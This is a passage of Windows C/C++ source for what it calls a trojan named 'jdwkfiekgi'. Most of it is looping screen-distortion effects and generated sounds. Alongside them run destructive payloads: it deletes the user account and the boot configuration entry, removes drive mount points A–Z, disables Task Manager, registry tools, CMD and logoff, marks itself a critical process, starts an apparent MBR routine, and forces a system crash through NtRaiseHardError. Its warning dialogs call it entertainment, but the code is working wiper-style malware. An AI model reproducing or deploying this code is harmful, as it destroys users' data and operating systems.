		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				FLOAT fx = ((x + i) ^ (y + i)) + y;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader7(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				FLOAT fx = (x - i) * (y + i);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI invcc(LPVOID lpParam) {
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		HRGN round = CreateRoundRectRgn(x, y, x + 100, y + 100, 30, 30);
		InvertRgn(hdc, round);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 1;
		}
		if (x == 0) {
			sx = 1;
		}
		DeleteObject(round);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader8(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	double angle = 0.0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		int xadd = (int)(sin(angle) * 50.0);
		int yadd = (int)(cos(angle) * 50.0);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				FLOAT fx = 239 + i;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		SetStretchBltMode(hdc, 3);
		StretchBlt(hdc, xadd / 2, yadd / 2, w - xadd, h - yadd, hdcCopy, 0, 0, w, h, SRCCOPY);
		angle = angle + 0.1963495408493621;
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI icons2(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		DrawIconEx(hdc, rand() % sw, rand() % sh, LoadIcon(0, MAKEINTRESOURCE(32512 + (rand() % 7))), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI last(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	HWND wnd = GetDesktopWindow();
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	double angle = 0;
	while (true) {
		hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (float z = 0; z < w + h; z += 0.99f) {
			int a = sin(angle) * 360;
			BitBlt(mdc, 0, z, w, 1, mdc, a, z, NOTSRCERASE);
			angle += M_PI / 3;
			DeleteObject(&z); DeleteObject(&a);
		}
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		ReleaseDC(wnd, mdc); DeleteObject(hbit); DeleteObject(mdc); DeleteObject(hdc);
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (567026124 >> (t >> 9 & 30) & 15) | ~t >> 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & 777) * t >> 8) | t >> 3;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t / (1 + (t >> 9 & t >> 8)) & 123);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if ((t >> 7 ^ t >> 12) != 0) buffer[t] = static_cast<char>(t * t / (t >> 7 ^ t >> 12));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6 | t << 1) + (t >> 5 | t << 3 | t >> 3) | t >> 2 | t << 1 | t >> (t & 6144 ? 3 : -5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t * (t >> 7 | t | t >> 9 | t >> 13));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(127 * (t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (3 & t >> (t & 2048 ? 2 : 10)) | t >> (t & 16384 ? t & 4096 ? 10 : 3 : 2)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (5 * t >> 7) & 128);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 7 | t >> 9) & 30) & t << 3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI fake(LPVOID lpParam) {
	MessageBox(NULL, L"File system error (-2147219196).", NULL, MB_ICONERROR);
	return 0;
}

DWORD WINAPI morewiping(LPVOID lpParam) {
	ShellExecuteA(NULL, "open", "net", "user %username% /delete", NULL, SW_HIDE);
	ShellExecuteA(NULL, "open", "bcdedit", "/delete {current}", NULL, SW_HIDE);
	ShellExecuteA(NULL, "open", "reg", "add hklm\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v HideFastUserSwitching /t reg_dword /d 1 /f", NULL, SW_HIDE);
	ShellExecuteA(NULL, "open", "reg", "add hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoLogoff /t reg_dword /d 1 /f", NULL, SW_HIDE);
	return 1;
}

DWORD WINAPI dvmp(LPVOID lpParam) {
	DeleteVolumeMountPointA("A:\\");
	DeleteVolumeMountPointA("B:\\");
	DeleteVolumeMountPointA("C:\\");
	DeleteVolumeMountPointA("D:\\");
	DeleteVolumeMountPointA("E:\\");
	DeleteVolumeMountPointA("F:\\");
	DeleteVolumeMountPointA("G:\\");
	DeleteVolumeMountPointA("H:\\");
	DeleteVolumeMountPointA("I:\\");
	DeleteVolumeMountPointA("J:\\");
	DeleteVolumeMountPointA("K:\\");
	DeleteVolumeMountPointA("L:\\");
	DeleteVolumeMountPointA("M:\\");
	DeleteVolumeMountPointA("N:\\");
	DeleteVolumeMountPointA("O:\\");
	DeleteVolumeMountPointA("P:\\");
	DeleteVolumeMountPointA("Q:\\");
	DeleteVolumeMountPointA("R:\\");
	DeleteVolumeMountPointA("S:\\");
	DeleteVolumeMountPointA("T:\\");
	DeleteVolumeMountPointA("U:\\");
	DeleteVolumeMountPointA("V:\\");
	DeleteVolumeMountPointA("W:\\");
	DeleteVolumeMountPointA("X:\\");
	DeleteVolumeMountPointA("Y:\\");
	DeleteVolumeMountPointA("Z:\\");
	return 1;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as jdwkfiekgi that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"jdwkfiekgi", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"jdwkfiekgi", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			ProcessIsCritical();
			CreateThread(0, 0, mbr, 0, 0, 0);
			CreateThread(0, 0, fake, 0, 0, 0);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			Sleep(1000);
			CreateThread(0, 0, morewiping, 0, 0, 0);
			Sleep(4000);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, icons, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			CreateThread(0, 0, dvmp, 0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
			HANDLE thread2dot1 = CreateThread(0, 0, triangles, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			TerminateThread(thread2dot1, 0);
			CloseHandle(thread2dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(500);
			HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, cube, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			RedrawWindow(0, 0, 0, 133);
			Sleep(500);
			HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, rectz, 0, 0, 0);
			HANDLE thread4dot2 = CreateThread(0, 0, icons1, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			TerminateThread(thread4dot1, 0);
			CloseHandle(thread4dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread5dot1 = CreateThread(0, 0, cur1, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			RedrawWindow(0, 0, 0, 133);
			Sleep(500);
			HANDLE thread6 = CreateThread(0, 0, patshake, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, textout, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			RedrawWindow(0, 0, 0, 133);
			Sleep(500);
			HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread8 = CreateThread(0, 0, shader7, 0, 0, 0);
			HANDLE thread8dot1 = CreateThread(0, 0, invcc, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			RedrawWindow(0, 0, 0, 133);
			Sleep(250);
			HANDLE thread9 = CreateThread(0, 0, shader8, 0, 0, 0);
			HANDLE thread9dot1 = CreateThread(0, 0, icons2, 0, 0, 0);
			sound8();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			RedrawWindow(0, 0, 0, 133);
			Sleep(250);
			HANDLE thread10 = CreateThread(0, 0, last, 0, 0, 0);
			sound9();
			Sleep(30000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}